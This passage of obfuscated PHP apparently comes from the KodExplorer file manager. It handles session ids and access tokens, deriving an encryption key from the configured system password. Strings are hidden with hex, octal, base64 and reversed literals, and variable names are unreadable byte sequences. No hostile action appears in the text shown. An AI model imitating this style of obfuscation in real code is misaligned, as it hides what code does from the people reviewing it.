$GLOBALS[_kstr2('config')][strrev('tsySgnittes').strrev('me')][base64_decode('c3lzdGVtUGFz')."\x73\x77\x6f\x72\x64"]; $a†÷¯ò„ = substr(md5("\153\157\144\105\170\160\154\157"."\x72\x65"."\x72\x5f" . $a†÷¯ò„), 0, 15); $fìÄÉ‰÷ˆ = Mcrypt::decode($cƒ³ºÉñÕ’, $a†÷¯ò„); if (!$fìÄÉ‰÷ˆ) { show_tips("\141\143\143\145\163\163\124\157\153\145\156\40"."\145\162\162\157\162\41"); } session_id($fìÄÉ‰÷ˆ); session_name(SESSION_ID); } function access_token_get() { $fìÄÉ‰÷ˆ = session_id(); $a†÷¯ò„ = $GLOBALS["\x63\x6f\x6e\x66\x69\x67"]["\x73\x65\x74\x74\x69\x6e\x67\x53\x79\x73\x74\x65"."\155"]["\x73\x79\x73\x74\x65\x6d\x50\x61".base64_decode('c3N3b3Jk')]; $a†÷¯ò„ = substr(md5("\x6b\x6f\x64\x45\x78\x70\x6c\x6f"."\162\145\162\137" . $a†÷¯ò„), 0, 15); $C†Œ†ìùš‹ = Mcrypt::encode($fìÄÉ‰÷ˆ, $a†÷¯ò„, 3600 * 24); return $C†Œ†ìùš‹; } function init_config() { init_setting(); init_session(); init_space_size_hook(); }
